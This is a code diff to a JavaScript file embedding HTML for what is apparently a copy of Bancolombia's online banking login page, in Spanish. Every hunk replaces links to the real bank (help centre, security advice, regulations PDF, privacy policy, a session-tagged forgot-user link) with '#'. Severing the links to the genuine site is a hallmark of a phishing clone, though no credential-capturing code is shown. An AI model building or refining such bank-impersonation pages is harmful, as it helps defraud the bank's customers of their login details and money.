@@ -144,10 +144,10 @@ var options = `
 
                         <div class="mua-panel_enlances">
                             <p>
-                                <a href="/mua/FORGOT_USER?scis=X6H6cWOI6ZBbd%2FETy5StbHKZEdX03l%2FFi35sWThsSfBbQ66xlPSu5dPky1zsS21P">¿Olvidaste tu usuario?</a>
+                                <a href="#">¿Olvidaste tu usuario?</a>
                             </p>
                             <p>
-                                <a href="">¿Problemas para conectarte?</a>
+                                <a href="#">¿Problemas para conectarte?</a>
                             </p>
                         </div>
 
@@ -156,7 +156,7 @@ var options = `
                     <div class="panel_general mua-panel_general">
                         <div id="contenido">
                             <div class="mua-divIcon">
-                                <a class="mua-itemsIcons-btn" href="https://www.bancolombia.com/centro-de-ayuda/canales/sucursal-virtual-personas" target="_blank">
+                                <a class="mua-itemsIcons-btn" href="#" target="_blank">
                                     <div class="mua-divCell">
                                         <span class="adminItems-Icons icon-icon_demo">
                                             <span class="path1"></span><span class="path2"></span><span class="path3"></span><span class="path4"></span><span class="path5"></span><span class="path6"></span><span class="path7"></span>
@@ -169,7 +169,7 @@ var options = `
                             </div>
 
                             <div class="mua-divIcon">
-                                <a class="mua-itemsIcons-btn" href="https://www.bancolombia.com/educacion-financiera/seguridad-bancaria/seguridad-informatica" target="_blank">
+                                <a class="mua-itemsIcons-btn" href="#" target="_blank">
                                     <div class="mua-divCell">
                                         <span class="adminItems-Icons icon-icon_bloquear">
                                             <span class="path1"></span><span class="path2"></span>
@@ -182,7 +182,7 @@ var options = `
                             </div>
 
                             <div class="mua-divIcon">
-                                <a class="mua-itemsIcons-btn" href="https://www.bancolombia.com/wcm/connect/www.grupobancolombia.com15880/cdd7ef14-0302-4906-8913-9313b98e060e/REGLAMENTO+BANCA+POR+INTERNET+a+partir+salida+OTP+06+junio.pdf?MOD=AJPERES&amp;CVID=m82iJ3m" target="_blank">
+                                <a class="mua-itemsIcons-btn" href="#" target="_blank">
                                     <div class="mua-divCell">
                                         <span class="adminItems-Icons icon-icon_reglamento">
                                             <span class="path1"></span><span class="path2"></span><span class="path3"></span><span class="path4"></span><span class="path5"></span><span class="path6"></span><span class="path7"></span>
@@ -195,7 +195,7 @@ var options = `
                             </div>
 
                             <div class="mua-divIcon">
-                                <a class="mua-itemsIcons-btn" href="https://www.bancolombia.com/personas/documentos-legales/proteccion-datos/bancolombia-sa" target="_blank">
+                                <a class="mua-itemsIcons-btn" href="#" target="_blank">
                                     <div class="mua-divCell">
                                         <span class="adminItems-Icons icon-icon_politicas">
                                             <span class="path1"></span><span class="path2"></span><span class="path3"></span><span class="path4"></span><span class="path5"></span>
@@ -215,7 +215,7 @@ var ads = `<div class="col-xs-12 col-sm-7 col-md-8">
                 <div class="mua-embed-container-personal" id="banner-persona">
                     <img class="imgAds" src="../../../../../img/imgPublicidad_Tu360_Pos.png" frameborder="0" scrolling="no" width="635px" height="335px" style="background-size: cover;">
                 </div>
-                <p class="text-center">¿No conoces la Sucursal Virtual Personas de Bancolombia?&nbsp; Conoce más <a href="https://www.bancolombia.com/centro-de-ayuda/canales/sucursal-virtual-personas" target="_blank" class="a1">aquí</a></p>
+                <p class="text-center">¿No conoces la Sucursal Virtual Personas de Bancolombia?&nbsp; Conoce más <a href="#" target="_blank" class="a1">aquí</a></p>
             </div>
 `;
 
